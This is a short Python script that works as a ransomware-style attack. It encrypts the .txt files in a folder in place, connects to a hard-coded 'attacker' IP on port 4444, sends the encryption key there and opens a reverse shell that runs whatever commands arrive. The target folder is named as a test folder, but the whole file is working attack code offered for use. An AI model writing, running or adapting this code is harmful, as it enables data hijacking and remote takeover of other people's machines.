         
from cryptography.fernet import Fernet
import os
import socket
import subprocess

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def encrypt_folder(folder_path, fernet, base_folder):
    for root, dirs, files in os.walk(folder_path):
        if base_folder not in root:
            continue
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, fernet)
                print(f"Encrypted: {file_path}")

def reverse_shell(host, port, encryption_key):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print("Connected to the attacker.")
            s.sendall(f"Encryption Key: {encryption_key.decode()}\n".encode())
            print("Encryption key sent.")

            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() == "exit":
                    break
                if command:
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        result = e.output
                    s.sendall(result)
    except Exception as e:
        print(f"Error with reverse shell: {e}")

# Main execution
key = generate_key()
fernet = Fernet(key)

folder_path = './test_encryption'
encrypt_folder(folder_path, fernet, folder_path)

# Print the encryption key
print(f"Encryption key: {key.decode()}")

# Set up reverse shell connection
reverse_host = "192.168.10.24"  # Replace with the attacker's IP
reverse_port = 4444             # Replace with the desired port
reverse_shell(reverse_host, reverse_port, key)

